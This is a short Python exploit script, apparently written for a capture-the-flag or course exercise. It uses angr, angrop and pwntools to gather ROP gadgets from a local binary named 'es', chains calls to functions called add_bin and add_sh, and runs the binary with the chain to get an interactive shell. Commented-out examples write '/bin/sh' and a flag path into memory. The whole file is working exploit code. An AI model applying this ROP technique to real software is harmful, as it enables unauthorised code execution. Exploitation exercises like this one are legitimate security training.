import angr 
import angrop
from pwn import *

EXE_FILE = './es'
exe = ELF(EXE_FILE)

p = angr.Project("./es")
rop = p.analyses.ROP()
rop.find_gadgets()
# angrop includes methods to create certain common chains

# setting registers
#chain = rop.set_regs(eax=0x1337, ebx=0x56565656)

# writing to memory 
# writes "/bin/sh\0" to address 0x61b100
#chain = rop.write_to_mem(0x61b100, b"/bin/sh\0")

# calling functions
#chain = rop.func_call("read", [0, 0x804f000, 0x100])

# adding values to memory
#chain = rop.add_to_mem(0x804f124, 0x41414141)

# chains can be added together to chain operations
#chain = rop.write_to_mem(0x61b100, b"/home/ctf/flag\x00") + rop.func_call("open", [0x61b100,os.O_RDONLY])

chain = rop.func_call("add_bin", [0xdeadbeaf])
chain += rop.func_call("add_sh", [0xcafebabe, 0x0badf00d])
chain += rop.func_call("add_bin", [])


# chains can be printed for copy pasting into exploits
chain.print_payload_code()

#print("Catena generata:" + chain)
io = process([EXE_FILE, chain]) # executing the executable with ropchain as input

io.interactive() # to manually interact with the spawn shell
